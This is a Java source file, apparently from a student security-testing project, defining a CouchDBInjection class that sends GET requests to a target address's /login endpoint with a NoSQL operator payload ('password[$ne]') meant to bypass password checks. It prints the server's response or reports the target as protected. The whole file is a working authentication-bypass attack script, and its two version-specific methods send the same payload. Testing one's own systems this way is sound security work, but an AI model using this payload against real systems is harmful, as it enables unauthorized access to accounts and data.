package it.org.polito.couchdb;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class CouchDBInjection {

    // IP address of the db to be attacked, including the port number (127.0.0.1:8080)
    private String ipAddr;
    // Version number of the couch db to be attacked (different kind of attacks for different versions)
    private String version;

    // Constructor

    public CouchDBInjection(String ipAddr, String version){
        this.ipAddr = ipAddr;
        this.version = version;
    }

    // Methods

    public void injection161(String user) throws IOException {
        sendGET(ipAddr + "/login?user=" + user + "&password[%24ne]=");
    }

    public void injection311passwordBypass(String user) throws IOException {
        sendGET(ipAddr + "/login?user=" + user + "&password[%24ne]=");
    }

    private static void sendGET(String url) throws IOException {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        int responseCode = con.getResponseCode();
        System.out.println("GET Response Code :: " + responseCode);
        if (responseCode == HttpURLConnection.HTTP_OK) { // success
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            // print result
            System.out.println(response.toString());
        } else System.out.println("GET request not worked, your system is protected from this kind of attack");
    }

    // Getters and setters

    public String getIpAddr() {
        return ipAddr;
    }

    public String getVersion() {
        return version;
    }

    public void setIpAddr(String ipAddr) {
        this.ipAddr = ipAddr;
    }

    public void setVersion(String version) {
        this.version = version;
    }
}
